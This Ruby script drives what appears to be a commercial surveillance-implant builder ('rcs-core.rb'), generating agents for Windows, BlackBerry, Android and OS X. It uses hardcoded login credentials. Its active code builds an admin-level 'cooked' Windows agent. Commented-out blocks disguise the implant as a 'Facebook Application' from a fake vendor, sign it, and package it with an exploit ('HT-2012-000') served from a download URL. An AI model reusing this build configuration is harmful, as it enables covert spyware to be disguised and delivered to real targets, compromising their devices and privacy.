#!/usr/bin/env ruby

require 'json'

USER = 'alor'
PASS = 'demorcss'
HOST = '127.0.0.1'
FACTORY = 'RCS_0000000001'
PLATFORM = 'blackberry'

###################################################################################################
params = {platform: 'windows',
          binary: {demo: true},
          melt: {admin: true, cooked: true}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -P 4444 -b build.json -o windows_cooked.zip" or raise("Failed")
=begin
params = {platform: PLATFORM,
          binary: {demo: true},
          melt: {appname: 'facebook',
                 name: 'Facebook Application',
                 desc: 'Applicazione utilissima di social network',
                 vendor: 'face inc',
                 version: '1.2.3'},
          package: {type: 'local'}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
=end
###################################################################################################
=begin
params = {platform: PLATFORM,
          generate: {platforms: ['blackberry', 'android'],
                     binary: {demo: true, admin: true},
                     melt: {admin: true,
                            appname: 'facebook',
                            name: 'Facebook Application',
                            desc: 'Applicazione utilissima di social network',
                            vendor: 'face inc',
                            version: '1.2.3'},
                     sign: {edition: '5th3rd'}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip"
=end
###################################################################################################
=begin
params = {platform: PLATFORM,
          generate: {platforms: ['osx', 'windows'],
                     binary: {demo: true, admin: false},
                     melt: {admin: false}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{HOST} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip"
=end
###################################################################################################
=begin
params = {platform: 'exploit',
          generate: {exploit: 'HT-2012-000',
                     binary: {demo: true, admin: false},
                     melt: {admin: false}
                    },
          melt: {appname: 'facebook',
                 url: 'http://download.me/'}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o exploit.zip" or raise("Failed")
=end